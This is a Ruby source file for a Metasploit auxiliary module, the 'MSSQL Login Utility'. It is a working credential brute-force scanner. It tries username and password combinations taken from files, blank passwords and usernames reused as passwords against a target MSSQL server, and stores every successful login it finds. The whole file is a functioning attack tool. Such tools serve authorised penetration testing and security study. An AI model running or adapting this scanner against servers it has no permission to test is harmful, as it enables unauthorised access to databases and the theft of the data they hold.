##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/mssql'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::MSSQL
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'MSSQL Login Utility',
      'Description'    => 'This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank).',
      'Author'         => 'MC',
      'References'     =>
        [
          [ 'CVE', '1999-0506'] # Weak password
        ],
      'License'        => MSF_LICENSE
    )
  end

  def run_host(ip)
    print_status("#{rhost}:#{rport} - MSSQL - Starting authentication scanner.")

    cred_collection = Metasploit::Framework::CredentialCollection.new(
        blank_passwords: datastore['BLANK_PASSWORDS'],
        pass_file: datastore['PASS_FILE'],
        password: datastore['PASSWORD'],
        user_file: datastore['USER_FILE'],
        userpass_file: datastore['USERPASS_FILE'],
        username: datastore['USERNAME'],
        user_as_pass: datastore['USER_AS_PASS'],
        realm: datastore['DOMAIN']
    )

    scanner = Metasploit::Framework::LoginScanner::MSSQL.new(
        host: ip,
        port: rport,
        proxies: datastore['PROXIES'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        connection_timeout: 30,
        windows_authentication: datastore['USE_WINDOWS_AUTHENT']
    )

    service_data = {
        address: ip,
        port: rport,
        service_name: 'mssql',
        protocol: 'tcp',
        workspace_id: myworkspace_id
    }

    scanner.scan! do |result|
      if result.success?
        credential_data = {
            module_fullname: self.fullname,
            origin_type: :service,
            private_data: result.credential.private,
            private_type: :password,
            username: result.credential.public
        }

        if datastore['USE_WINDOWS_AUTHENT']
          credential_data[:realm_key] = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
          credential_data[:realm_value] = result.credential.realm
        end
        credential_data.merge!(service_data)

        credential_core = create_credential(credential_data)

        login_data = {
            core: credential_core,
            last_attempted_at: DateTime.now,
            status: Metasploit::Model::Login::Status::SUCCESSFUL
        }
        login_data.merge!(service_data)

        create_credential_login(login_data)
        print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}"
      else
        login_data = {
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: nil,
            realm_value: nil,
            status: result.status
        }
        if datastore['USE_WINDOWS_AUTHENT']
          login_data[:realm_key] = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
          login_data[:realm_value] = result.credential.realm
        end
        invalidate_login(login_data)
        print_status "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end
  end

end
